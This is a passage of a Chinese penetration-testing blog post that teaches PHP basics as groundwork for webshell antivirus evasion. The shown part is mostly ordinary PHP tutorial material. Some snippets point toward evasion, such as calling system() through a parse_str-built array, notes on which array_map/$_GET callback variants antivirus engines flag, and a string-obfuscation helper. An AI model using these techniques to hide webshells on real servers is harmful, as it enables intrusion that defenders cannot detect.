---
title: PHP从零学习到Webshell免杀手册 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18867807
source: 博客园 - 渗透测试中心
date: 2025-05-10
fetch_date: 2025-10-06T22:30:01.470094
---

# PHP从零学习到Webshell免杀手册 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [PHP从零学习到Webshell免杀手册](https://www.cnblogs.com/backlion/p/18867807 "发布于 2025-05-09 11:00")

一、PHP相关资料

* PHP官方手册： <https://www.php.net/manual/zh/>
* PHP函数参考： <https://www.php.net/manual/zh/funcref.php>
* 菜鸟教程： <https://www.runoob.com/php/php-tutorial.html>
* w3school： <https://www.w3school.com.cn/php/index.asp>
* 渊龙Sec安全团队导航： [https://dh.aabyss.cn](https://dh.aabyss.cn/)

## 二、PHP函数速查

## 0# PHP基础

### 0.0 PHP基础格式

```
<?php
    //执行的相关PHP代码
?>
```

这是一个PHP文件的基本形式

### 0.1 .=和+=赋值

```
$a = 'a'; //赋值
$b = 'b'; //赋值
$c = 'c'; //赋值
$c .= $a;
$c .= $b;

echo $c; //cab
```

* `.=` 通俗的说，就是累积
* `+=` 意思是：左边的变量的值加上右边的变量的值，再赋给左边的变量

### 0.2 数组

**`array()` 函数用于创建数组**

```
$shuzu = array("AabyssZG","AabyssTeam");
echo "My Name is " . $shuzu[0] . ", My Team is " . $shuzu[1] . ".";
//My Name is AabyssZG, My Team is AabyssTeam.
```

**数组可嵌套：**

```
$r = 'b[]=AabyssZG&b[]=system';
$rce = array();      //用array函数新建数组
parse_str($r, $rce); //这个函数下文有讲
print_r($rce);
```

`$rce` 数组输出为：

```
Array (
    [b] => Array
        (
            [0] => AabyssZG
            [1] => system
        )
)
```

这时候可以这样利用

```
$rce['b'][1](参数);    //提取rce数组中的b数组内容，相当于system(参数)
echo $rce['b'][0];    //AabyssZG
```

**使用 `[]` 定义数组**

```
$z = ['A','a','b', 'y', 's', 's'];
$z[0] = 'A';
$z[1] = 'a';
$z[2] = 'b';
$z[3] = 'y';
$z[4] = 's';
$z[5] = 's';
```

这就是基本的一个数组，数组名为z，数组第一个成员为0，以此类推

**`compact()` 函数用于创建数组创建一个包含变量名和它们的值的数组**

```
$firstname = "Aabyss";
$lastname = "ZG";
$age = "21";

$result = compact("firstname", "lastname", "age");
print_r($result);
```

数组输出为：

```
Array ( [firstname] => Aabyss [lastname] => ZG [age] => 21 )
```

### 0.3 连接符

**`.` 最简单的连接符**

```
$str1="hello";
$str2="world";
echo $str1.$str2;    //helloworld
```

### 0.4 运算符

**`&` 运算符**

加减乘除应该不用我说了吧

```
($var & 1)  //如果$var是一个奇数，则返回true；如果是偶数，则返回false
```

**逻辑运算符**

特别是 `xor` 异或运算符，在一些场合需要用到

![xor.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250509110026685-517773432.png)

### 0.5 常量

**自定义常量**

```
define('-_-','smile');    //特殊符号开头，定义特殊常量
define('wo',3.14);
const wo = 3;
```

常量的命名规则

1. 常量不需要使用 `$` 符号，一旦使用系统就会认为是变量；
2. 常量的名字组成由字母、数字和下划线组成，不能以数字开头；
3. 常量的名字通常是以大写字母为主，以区别于变量；
4. 常量命名的规则比变量要松散，可以使用一些特殊字符，该方式只能使用 `define` 定义；

**`__FILE__` 常量（魔术常量）**

```
__FILE__ //返回文件的完整路径和文件名

dirname(__FILE__) //返回文件所在当前目录到系统根目录的一个目录结构（即代码所在脚本的路径，不会返回当前的文件名称）
```

**其他魔术常量**

```
__DIR__        //当前被执行的脚步所在电脑的绝对路径
__LINE__       //当前所示的行数
__NAMESPACE__  //当前所属的命名空间
__CLASS__      //当前所属的类
__METHOD__     //当前所属的方法
```

### 0.6 PHP特性

* PHP中函数名、方法名、类名不区分大小写，常量和变量区分大小写
* 在某些环境中，`<?php ?>` 没有闭合会导致无法正常运作

### 0.7 PHP标记几种写法

其中第一和第二种为常用的写法

```
第一种：<?php ?>
第二种：<?php
第三种：<? ?>
第四种：<% %>
第五种：<script language="php"></script>
```

第三种和第四种为短标识，当使用他们需要开启 `php.ini` 文件中的 `short_open_tag` ，不然会报错

### 0.8 $\_POST变量

在 PHP 中，预定义的 `$_POST` 变量用于收集来自 `method="post"` 的表单中的值

```
$num1=$_POST['num1'];
$num2=$_POST['num2'];
print_r($_POST);
```

当你在HTTP数据包Body传参时：

```
num1=1&num2=2
```

得到回显：

```
Array
(
    [num1] => 1
    [num2] => 2
)
```

## 1# 回调类型函数

### 1.0 Tips

在PHP的WebSehll免杀测试过程中，使用回调函数可以发现查杀引擎对函数和函数的参数是否有对应的敏感性

```
array_map('system', array('whoami'));        //被查杀
array_map($_GET['a'], array('whoami'));      //被查杀
array_map('var_dump', array('whoami'));      //未被查杀
array_map('system', array($_GET['a']));      //被查杀
```

这里在列举一些回调函数，感兴趣可以自行查找：

```
array_filter()
array_walk()
array_map()
array_reduce()
array_walk_recursive()
call_user_func_array()
call_user_func()
filter_var()
filter_var_array()
registregister_shutdown_function()
register_tick_function()
forward_static_call_array()
uasort()
uksort()
```

### 1.1 array\_map()

**`array_map()` 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组**

Demo：将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新的值的数组：

```
function myfunction($v)
{
return($v*$v);
}

$a=array(1,2,3,4,5);    //array(1,4,9,16,25)
print_r(array_map("myfunction",$a));
```

### 1.2 register\_shutdown\_function()

**`register_shutdown_function()` 函数是来注册一个会在PHP中止时执行的函数**

PHP中止的情况有三种：

* 执行完成
* exit/die导致的中止
* 发生致命错误中止

Demo：后面的after并没有输出，即 `exit` 或者是 `die` 方法导致提前中止

```
function test()
{
 echo '这个是中止方法test的输出';
}

register_shutdown_function('test');

echo 'before' . PHP_EOL;
exit();
echo 'after' . PHP_EOL;
```

输出：

```
before
这个是中止方法test的输出
```

### 1.3 array\_walk()

**`array_walk()` 函数对数组中的每个元素应用用户自定义函数**

Demo：这个很简单，直接看就明白了

```
function myfunction($value,$key,$p)
{
echo "The key $key $p $value<br>";
}
$a=array("a"=>"red","b"=>"green","c"=>"blue");
array_walk($a,"myfunction","has the value");
```

输出：

```
The key a has the value red
The key b has the value green
The key c has the value blue
```

### 1.4 array\_filter()

**`array_filter()` 函数用回调函数过滤数组中的元素**

该函数把输入数组中的每个键值传给回调函数：如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组（数组键名保持不变）

Demo：

```
function test_odd($var)
{
    return($var & 1);
}

$a1=array("a","b",2,3,4);
print_r(array_filter($a1,"test_odd"));
```

输出：

```
Array ( [3] => 3 )
```

### 1.5 foreach()

**`foreach()` 方法用于调用数组的每个元素，并将元素传递给回调函数**

foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。

Demo：

```
$arr = array(1,2,3,4);
//用foreach来处理$arr
foreach($arr as $k=>$v) {
    $arr[$k] = 2 * $v;
}
print_r($arr);
```

输出：

```
Array
(
    [0] => 2
    [1] => 4
    [2] => 6
    [3] => 8
)
```

### 1.6 isset()

**`isset()` 函数用于检测变量是否已设置并且非 NULL**

isset 在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false
isset 只能用于变量，因为传递任何其它参数都将造成解析错误

Demo:

```
$var = '';

// 结果为 TRUE，所以后边的文本将被打印出来。
if (isset($var)) {
    echo "变量已设置。" . PHP_EOL;
}

// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。
// the return value of isset().

$a = "test";
$b = "anothertest";

var_dump(isset($a));      // TRUE
var_dump(isset($a, $b)); // TRUE

unset ($a);

var_dump(isset($a));     // FALSE
var_dump(isset($a, $b)); // FALSE

$foo = NULL;
var_dump(isset($foo));   // FALSE
```

输出：

```
bool(true)
bool(true)
bool(false)
bool(false)
bool(false)
```

## 2# 字符串处理类函数

### 2.0 Tips

可以自己定义函数，组成字符串的拼接方式，比如：

```
function confusion($a){
    $s = ['A','a','b', 'y', 's', 's', 'T', 'e', 'a', 'm'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
ec...